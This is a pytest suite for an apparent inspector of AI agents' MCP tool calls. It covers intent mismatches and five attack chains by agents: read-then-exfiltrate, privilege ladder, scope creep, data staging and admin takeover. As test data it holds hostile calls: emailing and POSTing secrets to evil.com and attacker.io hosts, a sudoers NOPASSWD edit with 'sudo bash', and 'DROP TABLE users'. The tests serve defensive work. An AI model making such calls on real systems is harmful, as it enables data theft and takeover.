"""
Tests for modules/identity/mcp_inspector.py — MCP Intent-Aware Inspection.

Sprint 5-4: parameter validation, intent mismatch detection, chain analysis,
5 canonical attack scenarios, violation management, tool registry.
"""

from __future__ import annotations

import importlib
import os
import uuid

import pytest


# ── Fixture ───────────────────────────────────────────────────────────────────

@pytest.fixture(autouse=True)
def isolated_db(tmp_path, monkeypatch):
    db_file = tmp_path / "test_mcp.db"
    monkeypatch.setenv("DATA_DB_PATH", str(db_file))
    import modules.identity.mcp_inspector as mi
    importlib.reload(mi)
    mi.init_db()
    yield mi


TENANT = "tenant-mcp-test"


def _session() -> str:
    return str(uuid.uuid4())


def _inspect(mi, tool_name, params=None, session_id=None,
             agent_id=None, declared_intent=None):
    return mi.inspect_call(
        tenant_id=TENANT,
        session_id=session_id or _session(),
        tool_name=tool_name,
        params=params or {},
        agent_id=agent_id,
        declared_intent=declared_intent,
    )


# ── Tool registry ─────────────────────────────────────────────────────────────

def test_builtin_tools_seeded(isolated_db):
    mi = isolated_db
    tools = mi.list_tools(tenant_id=TENANT)
    tool_names = {t["tool_name"] for t in tools}
    assert "read_file" in tool_names
    assert "write_file" in tool_names
    assert "execute_command" in tool_names
    assert "send_email" in tool_names


def test_register_custom_tool(isolated_db):
    mi = isolated_db
    tool = mi.register_tool(
        tenant_id=TENANT,
        tool_name="my_custom_tool",
        access_mode="read",
        description="Custom read-only tool",
        allowed_params=["query"],
        forbidden_params=["write"],
    )
    assert tool["tool_name"] == "my_custom_tool"
    assert tool["access_mode"] == "read"


def test_register_invalid_access_mode_raises(isolated_db):
    mi = isolated_db
    with pytest.raises(ValueError, match="access_mode must be one of"):
        mi.register_tool(
            tenant_id=TENANT,
            tool_name="bad_tool",
            access_mode="destroy",
        )


def test_get_tool_returns_builtin(isolated_db):
    mi = isolated_db
    tool = mi.get_tool(tenant_id=TENANT, tool_name="read_file")
    assert tool["access_mode"] == "read"


def test_get_unknown_tool_returns_empty(isolated_db):
    mi = isolated_db
    result = mi.get_tool(tenant_id=TENANT, tool_name="nonexistent_tool_xyz")
    assert result == {}


def test_tenant_specific_tool_overrides_builtin(isolated_db):
    mi = isolated_db
    # Override read_file to be "write" for this tenant
    mi.register_tool(
        tenant_id=TENANT,
        tool_name="read_file",
        access_mode="write",
        description="Custom override",
    )
    tool = mi.get_tool(tenant_id=TENANT, tool_name="read_file")
    assert tool["access_mode"] == "write"
    assert tool["tenant_id"] == TENANT


# ── Clean inspection (no violations) ─────────────────────────────────────────

def test_clean_read_file_allowed(isolated_db):
    mi = isolated_db
    result = _inspect(mi, "read_file", params={"path": "/etc/config.yaml"})
    assert result["recommendation"] == "allow"
    assert result["allowed"] is True
    assert result["risk_score"] == 0.0
    assert result["violations"] == []


def test_clean_write_file_allowed(isolated_db):
    mi = isolated_db
    result = _inspect(mi, "write_file", params={"path": "/tmp/out.txt", "content": "hello"})
    assert result["recommendation"] == "allow"
    assert result["allowed"] is True


# ── Forbidden parameter violations ───────────────────────────────────────────

def test_forbidden_param_key_detected(isolated_db):
    mi = isolated_db
    # read_file has "write" in forbidden_params
    result = _inspect(mi, "read_file", params={"path": "/etc/file", "write": "true"})
    types = [v["type"] for v in result["violations"]]
    assert "forbidden_param" in types
    assert result["recommendation"] in ("flag", "block")


def test_forbidden_value_in_database_query(isolated_db):
    mi = isolated_db
    # database_query has DROP in forbidden_params
    result = _inspect(mi, "database_query", params={"query": "DROP TABLE users"})
    types = [v["type"] for v in result["violations"]]
    assert any(t in ("forbidden_param", "forbidden_value") for t in types)
    assert result["risk_score"] > 0


def test_forbidden_value_insert_in_query(isolated_db):
    mi = isolated_db
    result = _inspect(mi, "database_query", params={"query": "INSERT INTO secrets VALUES (1)"})
    types = [v["type"] for v in result["violations"]]
    assert "forbidden_value" in types


# ── Intent mismatch detection ─────────────────────────────────────────────────

def test_intent_mismatch_read_vs_write(isolated_db):
    mi = isolated_db
    # Agent says "read" but calls write_file (access_mode=write)
    result = _inspect(mi, "write_file",
                      params={"path": "/etc/passwd", "content": "evil"},
                      declared_intent="read")
    types = [v["type"] for v in result["violations"]]
    assert "intent_mismatch" in types
    assert result["risk_score"] >= 0.5


def test_intent_mismatch_read_vs_exfil(isolated_db):
    mi = isolated_db
    result = _inspect(mi, "send_email",
                      params={"to": "attacker@evil.com", "body": "secrets"},
                      declared_intent="read")
    types = [v["type"] for v in result["violations"]]
    assert "intent_mismatch" in types
    # Critical mismatch should block
    assert result["recommendation"] in ("flag", "block")


def test_matching_declared_intent_no_mismatch(isolated_db):
    mi = isolated_db
    result = _inspect(mi, "read_file",
                      params={"path": "/data/report.csv"},
                      declared_intent="read")
    types = [v["type"] for v in result["violations"]]
    assert "intent_mismatch" not in types


# ── Unknown tool ──────────────────────────────────────────────────────────────

def test_unknown_tool_flagged(isolated_db):
    mi = isolated_db
    result = _inspect(mi, "mystery_tool_xyz", params={"arg": "value"})
    types = [v["type"] for v in result["violations"]]
    assert "unknown_tool" in types
    assert result["risk_score"] > 0


# ── Param constraint violations ───────────────────────────────────────────────

def test_param_constraint_max_length(isolated_db):
    mi = isolated_db
    long_path = "A" * 5000
    result = _inspect(mi, "read_file", params={"path": long_path})
    types = [v["type"] for v in result["violations"]]
    assert "param_constraint_violation" in types


def test_param_constraint_enum_invalid(isolated_db):
    mi = isolated_db
    result = _inspect(mi, "http_request",
                      params={"url": "http://example.com", "method": "NUKE"})
    types = [v["type"] for v in result["violations"]]
    assert "param_constraint_violation" in types


def test_param_constraint_enum_valid(isolated_db):
    mi = isolated_db
    result = _inspect(mi, "http_request",
                      params={"url": "http://example.com", "method": "GET"})
    types = [v["type"] for v in result["violations"]]
    assert "param_constraint_violation" not in types


def test_param_constraint_required_missing(isolated_db):
    mi = isolated_db
    # expand_scope requires 'approver'
    result = _inspect(mi, "expand_scope",
                      params={"agent_id": "agt-1", "scope": "admin"})
    types = [v["type"] for v in result["violations"]]
    assert "missing_required_param" in types


# ── Chain pattern detection (5 canonical attack scenarios) ───────────────────

def test_attack_read_then_exfil(isolated_db):
    """Scenario 1: read file → send_email = exfiltration pattern"""
    mi = isolated_db
    sid = _session()
    _inspect(mi, "read_file", params={"path": "/etc/secrets"}, session_id=sid)
    result = _inspect(mi, "send_email",
                      params={"to": "outside@evil.com", "body": "data"},
                      session_id=sid)
    pattern_names = [p["name"] for p in result["chain_patterns"]]
    assert "read_then_exfil" in pattern_names
    assert result["risk_score"] > 0.5


def test_attack_privilege_ladder(isolated_db):
    """Scenario 2: read → write → execute = privilege escalation"""
    mi = isolated_db
    sid = _session()
    _inspect(mi, "read_file", params={"path": "/etc/sudoers"}, session_id=sid)
    _inspect(mi, "write_file", params={"path": "/etc/sudoers", "content": "evil ALL=(ALL) NOPASSWD:ALL"}, session_id=sid)
    result = _inspect(mi, "execute_command", params={"command": "sudo bash"}, session_id=sid)
    pattern_names = [p["name"] for p in result["chain_patterns"]]
    assert "privilege_ladder" in pattern_names


def test_attack_scope_creep(isolated_db):
    """Scenario 3: admin → write → execute = scope creep / policy manipulation"""
    mi = isolated_db
    sid = _session()
    _inspect(mi, "update_policy",
             params={"policy_id": "p1", "rules": {}, "actor": "agent"},
             session_id=sid)
    _inspect(mi, "write_file", params={"path": "/config/policy.json", "content": "{}"},
             session_id=sid)
    result = _inspect(mi, "execute_command", params={"command": "apply_policy"},
                      session_id=sid)
    pattern_names = [p["name"] for p in result["chain_patterns"]]
    assert "scope_creep" in pattern_names


def test_attack_data_staging(isolated_db):
    """Scenario 4: read → read → write = data staging for exfil"""
    mi = isolated_db
    sid = _session()
    _inspect(mi, "read_file", params={"path": "/db/users.csv"}, session_id=sid)
    _inspect(mi, "database_query", params={"query": "SELECT * FROM orders"}, session_id=sid)
    result = _inspect(mi, "write_file",
                      params={"path": "/tmp/staged.tar.gz", "content": "binary"},
                      session_id=sid)
    pattern_names = [p["name"] for p in result["chain_patterns"]]
    assert "data_staging" in pattern_names


def test_attack_admin_takeover(isolated_db):
    """Scenario 5: admin → exfil = admin takeover"""
    mi = isolated_db
    sid = _session()
    _inspect(mi, "expand_scope",
             params={"agent_id": "agt-1", "scope": "superadmin", "justification": "none", "approver": "attacker"},
             session_id=sid)
    result = _inspect(mi, "http_request",
                      params={"url": "https://attacker.io/exfil", "method": "POST", "body": "secrets"},
                      session_id=sid)
    pattern_names = [p["name"] for p in result["chain_patterns"]]
    assert "admin_takeover" in pattern_names


# ── Chain isolation across sessions ───────────────────────────────────────────

def test_chain_patterns_isolated_per_session(isolated_db):
    """Chain patterns must not leak across different sessions."""
    mi = isolated_db
    sid_a = _session()
    sid_b = _session()
    _inspect(mi, "read_file", params={"path": "/etc/secrets"}, session_id=sid_a)
    # Send email in a DIFFERENT session — should NOT match read_then_exfil
    result = _inspect(mi, "send_email",
                      params={"to": "outside@evil.com", "body": "data"},
                      session_id=sid_b)
    pattern_names = [p["name"] for p in result["chain_patterns"]]
    assert "read_then_exfil" not in pattern_names


# ── Violation management ──────────────────────────────────────────────────────

def test_violations_recorded(isolated_db):
    mi = isolated_db
    _inspect(mi, "read_file", params={"path": "/x", "write": "bad"})
    violations = mi.list_violations(tenant_id=TENANT)
    assert len(violations) >= 1


def test_violations_filter_unresolved(isolated_db):
    mi = isolated_db
    _inspect(mi, "read_file", params={"write": "bad"})
    unresolved = mi.list_violations(tenant_id=TENANT, resolved=False)
    assert all(not v["resolved"] for v in unresolved)


def test_resolve_violation(isolated_db):
    mi = isolated_db
    _inspect(mi, "read_file", params={"write": "bad"})
    violations = mi.list_violations(tenant_id=TENANT, resolved=False)
    assert len(violations) >= 1
    vid = violations[0]["violation_id"]
    resolved = mi.resolve_violation(
        tenant_id=TENANT, violation_id=vid, resolved_by="ops@acme.io"
    )
    assert resolved["resolved"] is True
    assert resolved["resolved_by"] == "ops@acme.io"


def test_resolve_nonexistent_raises(isolated_db):
    mi = isolated_db
    with pytest.raises(KeyError):
        mi.resolve_violation(tenant_id=TENANT, violation_id="not-real", resolved_by="x")


# ── Chain log retrieval ───────────────────────────────────────────────────────

def test_get_chain_returns_ordered_calls(isolated_db):
    mi = isolated_db
    sid = _session()
    _inspect(mi, "read_file", params={"path": "/a"}, session_id=sid)
    _inspect(mi, "write_file", params={"path": "/b", "content": "x"}, session_id=sid)
    chain = mi.get_chain(tenant_id=TENANT, session_id=sid)
    assert len(chain) == 2
    assert chain[0]["tool_name"] == "read_file"
    assert chain[1]["tool_name"] == "write_file"


def test_get_chain_tenant_isolation(isolated_db):
    mi = isolated_db
    sid = _session()
    _inspect(mi, "read_file", params={"path": "/a"}, session_id=sid)
    chain = mi.get_chain(tenant_id="other-tenant", session_id=sid)
    assert len(chain) == 0


# ── Risk scoring ──────────────────────────────────────────────────────────────

def test_clean_call_zero_risk(isolated_db):
    mi = isolated_db
    result = _inspect(mi, "read_file", params={"path": "/safe/path"})
    assert result["risk_score"] == 0.0


def test_high_severity_violation_high_risk(isolated_db):
    mi = isolated_db
    result = _inspect(mi, "read_file", params={"write": "bad"})
    assert result["risk_score"] >= 0.5
